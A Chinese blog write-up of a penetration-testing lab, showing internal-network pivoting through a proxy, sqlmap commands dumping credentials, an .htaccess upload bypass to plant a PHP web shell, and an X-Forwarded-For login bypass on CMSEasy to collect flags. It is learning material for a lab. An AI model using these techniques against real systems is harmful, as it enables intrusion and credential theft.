+<p>新增记录：即以本地的9998端口开启代理</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-29-52-image.png" alt="" /></p>
+<p>接下来就可以在kali执行内网探测：</p>
+<p>进入<code>/root/Desktop/tools/PortScan/</code>目录，在该目录下打开终端，这是kali自带的ip扫描工具，用就完了</p>
+<p>用以下命令使用代理扫描内网前十个IP地址</p>
+<p><code>proxychains python scan.py 192.168.1.1 192.168.1.10 -t 20</code></p>
+<p>上面命令的proxychains是代表在代理情况下执行后续命令，没有这个就扫不出来</p>
+<p>如下图：发现三个ip地址的80端口开着</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-35-02-image.png" alt="" /></p>
+<p>其中1.7的ip地址我们已经渗透完了，那就另外两个ip地址即为我们的攻击目标</p>
+<p>接下来为了在win侦查机中打开对应的内网网页，就需要打开代理软件</p>
+<p>但是靶场里面的软件支持过期了，直接搜索proxifier也可</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-59-04-image.png" alt="" /></p>
+<p>在这个代理软件里面填上kali的ip地址以及端口，这样就相当于win通过kali连接上了wakanda的内网。</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-58-55-image.png" alt="" /></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-59-17-image.png" alt="" /></p>
+<p>设置代理完相当于此时win10就是内网的wakanda机器，来访问其他的内网机器，比如此时的192.168.1.8的80端口：可以访问，发现下图页面</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-09-12-image.png" alt="" /></p>
+<p>里面的目录都点一下试试，进入test之后发现网页路径可能存在sql注入（页面里面有?id=1）</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-10-10-image.png" alt="" /></p>
+<p>试一下，加一个分号发现报错，那就是有回显的sql注入了</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-11-07-image.png" alt="" /></p>
+<p>这里想尝试一下手工注入，再尝试一下发现是双引号闭合，但是还是注入不了</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-12-33-image.png" alt="" /></p>
+<p>那实在不行就直接kali的sqlmap注入一下</p>
+<p>如下在命令终端中执行</p>
+<p><code>proxychains sqlmap -u http://192.168.1.8/cat.php?id=1 --dbs</code></p>
+<p>还行需要代理，不然访问不了，kali还是相当于外网机：成功开始注入</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-19-14-image.png" alt="" /></p>
+<p>成功注出数据库：</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-26-53-image.png" alt="" /></p>
+<p>先查看public数据库的表</p>
+<p><code>proxychains sqlmap -u http://192.168.1.8/cat.php?id=1 -D public --tables</code></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-27-38-image.png" alt="" /></p>
+<p>再看user的表内容</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-31-15-image.png" alt="" /></p>
+<p>注出admin的密码：P4ssw0rd</p>
+<p>同时拿到第四个flag：8efe310f9ab3efeae8d410a8e0166eb2</p>
+<p>然后进入admin网页，登录一下</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-32-18-image.png" alt="" /></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-34-33-image.png" alt="" /></p>
+<p>登录之后发现可以添加图片，可以进行文件上传：</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-38-24-image.png" alt="" /></p>
+<p>但是不能上传php后缀的文件，那应该就是文件上传漏洞了。</p>
+<p>则可以用.htaccess绕过，前面的博客已经提到过</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-39-12-image.png" alt="" /></p>
+<p>上传成功，这里我用powershell改了文件名，正常win不让你改成.htaccess的文件名，用Rename-item即可改名字</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-41-47-image.png" alt="" /></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-42-02-image.png" alt="" /></p>
+<p>则再上传一个.xyth后缀的文件即可，里面放上一句话木马</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-44-18-image.png" alt="" /></p>
+<p>上传成功</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-44-41-image.png" alt="" /></p>
+<p>接下来就是蚁剑直连！测试一下，通过！</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-48-31-image.png" alt="" /></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-49-51-image.png" alt="" /></p>
+<p>此时就算是内网的博客系统被我们拿下了。这阶段结束。</p>
+
+        <h2 id="阶段2-2内网渗透cms"   >
+          <a href="#阶段2-2内网渗透cms" class="heading-link"><i class="fas fa-link"></i></a><a class="markdownIt-Anchor" href="#阶段2-2内网渗透cms"></a> 阶段2-2：内网渗透CMS</h2>
+      
+<p>访问192.168.1.6，发现是cmseasy的内部网站</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-56-48-image.png" alt="" /></p>
+<p>根据任务描述发现有纵向越权漏洞，可以在不知道管理员身份信息以及密码信息的情况下登录网站后台。</p>
+<blockquote>
+<p>根据漏洞原理中得知，现在需要使用modify伪造一个ip，然后编辑get参数绕过后台登录认证。</p>
+<p>使用modify使用X-Forwarded-For方式（网站获取ip的函数是获取http请求中的X-Forward-For字段），设置ip为网站的IP地址，然后点击start伪造ip。构造我们的get参数为：<code>admin_dir=admin&amp;site=default&amp;ishtml=1</code></p>
+</blockquote>
+<p>先伪造ip：</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-13-34-image.png" alt="" /></p>
+<p>然后直接访问：</p>
+<p>进入后台</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-13-12-image.png" alt="" /></p>
+<p>在标题位置发现flag1：</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-15-08-image.png" alt="" /></p>
+<p>flag1={mMyVrXbHYiTkO8osbrCbEIx1D4Tcf3WP}</p>
+<p>此时我们虽然进入了后台，但是还不是管理员身份，所以进入不了其他网页</p>
+<p>设置参数为：  查看语言项<br />
+<code>case=language&amp;act=edit&amp;table=orders&amp;admin_dir=admin&amp;site=default&amp;ishtml=1</code></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-30-01-image.png" alt="" /></p>
+<p>直接翻到最后一页，发现路径以及密码</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-30-28-image.png" alt="" /></p>
+<p>按给的路径和密码连接不上，观察一下改一下单词就可以蚁剑连接了，连接测试通过！</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-19-09-image.png" alt="" /></p>
+<p>然后在该文件下找到第二个flag</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-19-45-image.png" alt="" /></p>
+<p>/config/config.php然后去配置文件找数据库密码</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-39-14-image.png" alt="" /></p>
+<p>同时拿到flag3，如上</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-22-08-image.png" alt="" /></p>
+<p>直接添加之后连接，测试通过</p>
+<p>找到flag4，获得base64的flag</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-23-03-image.png" alt="" /></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-23-23-image.png" alt="" /></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-25-46-image.png" alt="" /></p>
+<p>flag4：P7iy1FflMZLZkDws35qE2cLOAWMscVj7</p>
+<p>flag5直接在/etc目录下找到</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-24-12-image.png" alt="" /></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-24-19-image.png" alt="" /></p>
+<p>就算全部渗透完了。</p>
+<p>最后一阶段利用的是cms的漏洞，完成的比较仓促，因为环境快关了。但问题不大。主要目的是了解一下渗透测试的基本流程。</p>
+
+        <h2 id="总结一下"   >
+          <a href="#总结一下" class="heading-link"><i class="fas fa-link"></i></a><a class="markdownIt-Anchor" href="#总结一下"></a> 总结一下</h2>
+      
+<p>基本渗透测试流程就是先根据网站打入其服务器，然后提权到root，建立代理，利用被打下的机器继续渗透其他内网机器，然后攻击。简单的流程应该会这样，但实际上最难得部分应该就是如何打入服务器。害，学吧。</p>
+<hr />
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://thenights1.github.io">nevgiver</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://thenights1.github.io/2024/03/19/shentou1/">https://thenights1.github.io/2024/03/19/shentou1/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://thenights1.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/">文件上传绕过</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://thenights1.github.io/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://thenights1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://thenights1.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2024/03/01/nnnnnnnnnnnnn/"><span class="paginator-prev__text">杂想乱谈[0x00]</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B6%E6%AE%B51%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E5%94%AF%E4%B8%80%E5%AF%B9%E5%A4%96%E6%9C%BA%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">
+           阶段1：渗透内网唯一对外机器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B6%E6%AE%B52%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">
+           阶段2：内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B6%E6%AE%B52-1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.1.</span> <span class="toc-text">
+           阶段2-1 内网渗透博客系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B6%E6%AE%B52-2%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fcms"><span class="toc-number">2.2.</span> <span class="toc-text">
+           阶段2-2：内网渗透CMS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">
+           总结一下</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://upload-bbs.mihoyo.com/upload/2021/10/26/74359262/6c25b31a89526ae231affd2cd01b0199_5510541678105571893.jpg?x-oss-process=image/auto-orient,0/interlace,1/format,jpg" alt="avatar"></div><p class="sidebar-ov-author__text">一个人，要走过多远的距离，才能在时光的尽头，寻回最初的自己。</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/thenights1" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://cameudis.github.io/" target="_blank" rel="noopener" data-popover="social.友链" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-gratipay"></i></span></a><a class="sidebar-ov-social-item" href="My WeChat ID is gwb12581" target="_blank" rel="noopener" data-popover="微信" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="My QQ number is 2785895987" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">21</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">12</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">18</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>nevgiver</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div><div class="busuanzi"></div><div>执拗的花朵永远不会因暴雨而褪去颜色，你的决心也一定能在绝境中绽放真我。</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ribbon.js@latest/dist/ribbon.min.js" size="120" alpha="0.6" zIndex="-1"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function loadValine () {
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var guest_info = 'nick,mail,link';
+
+  guest_info = guest_info.split(',').filter(function(item) {
+    return GUEST_INFO.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#valine-container',
+    appId: 'FRYdoyUkUkHMwPMiF2Ug3vMi-gzGzoHsz',
+    appKey: 'iRvJDapkfqlLvjbDW06gVYX7',
+    notify: true,
+    verify: true,
+    placeholder: '唉，时间真是个讨厌的东西，你不觉得吗？如果不是时间紧迫，我还想留下更多值得纪念的话语。',
+    avatar: 'mp',
+    meta: guest_info,
+    pageSize: '10' || 10,
+    visitor: true,
+    recordIP: true,
+    lang: 'zh-cn' || 'zh-cn',
+    path: window.location.pathname
+  });
+}
+
+if (false) {
+  loadValine();
+} else {
+  window.addEventListener('DOMContentLoaded', loadValine, false);
+}</script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script><script type="application/json" src="/search.json"></script></body></html>
